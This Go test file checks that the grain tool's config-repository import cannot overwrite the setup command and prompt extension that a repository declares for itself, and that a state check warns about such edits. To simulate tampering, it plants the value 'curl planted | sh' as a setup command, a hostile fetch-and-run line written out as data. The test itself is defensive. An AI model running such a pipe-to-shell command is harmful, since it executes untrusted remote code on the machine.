// Copyright 2026 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package staterepo_test

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/ai-on-gke/grain/pkg/model"
	"github.com/ai-on-gke/grain/pkg/model/sqlite"
	"github.com/ai-on-gke/grain/pkg/staterepo"
)

// The four repo_config columns a repository's own .grain/settings.yml
// writes are the declaration sync's, which rewrites them only when the
// repository's default branch moves. So grain/config neither carries them
// nor sets them: an edit there would otherwise stick -- and be appended to
// every prompt -- until the next merge in the target repository
// (design/spec/settings/settings-mutability.spec.md §2.8.2). The
// operator's own columns beside them stay the config repository's.
func TestTheRepositoryDeclaredColumnsAreNeverSetFromTheConfigRepository(t *testing.T) {
	t.Parallel()
	ctx := context.Background()
	db, err := sqlite.Open(sqlite.DefaultConfig(t.TempDir()))
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { db.Close() })
	store := model.New(db)
	if err := store.Init(ctx); err != nil {
		t.Fatal(err)
	}
	if err := store.PutConfig(ctx, model.DefaultConfig()); err != nil {
		t.Fatal(err)
	}
	repo := model.RepoRef{Owner: "acme", Name: "widgets"}
	if err := store.PutRepoConfig(ctx, model.RepoConfig{
		Repo:                    repo,
		Declarations:            true,
		PromptExtension:         "Operator: run make test.",
		SetupCommand:            "make deps",
		DeclaredPromptExtension: "Declared: use conventional commits.",
		DeclaredSetupCommand:    "npm ci",
		DeclaredPortBranches:    []string{"release-1"},
	}); err != nil {
		t.Fatal(err)
	}

	dir := t.TempDir()
	if err := staterepo.ExportConfig(ctx, db, dir); err != nil {
		t.Fatal(err)
	}
	path := filepath.Join(dir, staterepo.TablesDir, "repo_config.json")
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	for _, needle := range []string{"declared_prompt_extension", "declared_setup_command",
		"declared_port_branches", "declared_port_types", "Declared: use conventional commits."} {
		if strings.Contains(string(data), needle) {
			t.Errorf("repo_config.json carries %q:\n%s", needle, data)
		}
	}
	if !strings.Contains(string(data), "Operator: run make test.") {
		t.Errorf("repo_config.json lost the operator's prompt extension:\n%s", data)
	}

	// An edit to the operator's column and one naming a declared column,
	// merged together.
	var rows []map[string]any
	if err := json.Unmarshal(data, &rows); err != nil {
		t.Fatal(err)
	}
	rows[0]["prompt_extension"] = "Operator: run make check."
	rows[0]["declared_prompt_extension"] = "Planted from grain/config."
	rows[0]["declared_setup_command"] = "curl planted | sh"
	out, err := json.Marshal(rows)
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, out, 0o600); err != nil {
		t.Fatal(err)
	}
	if err := staterepo.ImportTables(ctx, db, dir, staterepo.SettingsTables); err != nil {
		t.Fatal(err)
	}
	got, err := store.GetRepoConfig(ctx, repo)
	if err != nil || got == nil {
		t.Fatalf("GetRepoConfig = %v, %v", got, err)
	}
	if got.PromptExtension != "Operator: run make check." {
		t.Errorf("operator prompt extension = %q, want the merged one", got.PromptExtension)
	}
	if got.DeclaredPromptExtension != "Declared: use conventional commits." ||
		got.DeclaredSetupCommand != "npm ci" ||
		strings.Join(got.DeclaredPortBranches, ",") != "release-1" {
		t.Errorf("declared layer after applying = %q / %q / %q, want what the declaration sync wrote",
			got.DeclaredPromptExtension, got.DeclaredSetupCommand, got.DeclaredPortBranches)
	}

	// And `grain state check` says why, naming the file that does own it.
	if err := staterepo.WriteSchemaVersion(dir, model.SchemaVersion); err != nil {
		t.Fatal(err)
	}
	scratch, err := sqlite.Open(sqlite.DefaultConfig(t.TempDir()))
	if err != nil {
		t.Fatal(err)
	}
	defer scratch.Close()
	if err := model.New(scratch).Init(ctx); err != nil {
		t.Fatal(err)
	}
	report, err := staterepo.Check(ctx, scratch, dir, model.SchemaVersion)
	if err != nil {
		t.Fatal(err)
	}
	var said int
	for _, w := range report.Warnings {
		if strings.Contains(w, "declared_") && strings.Contains(w, ".grain/settings.yml") &&
			strings.Contains(w, "never imported") {
			said++
		}
		if strings.Contains(w, "declared_port_types") || strings.Contains(w, "declared_port_branches") {
			t.Errorf("a warning names a declared column the file leaves out: %s", w)
		}
	}
	if said != 2 {
		t.Errorf("want a .grain/settings.yml warning for each of the two declared columns; got %q", report.Warnings)
	}
}
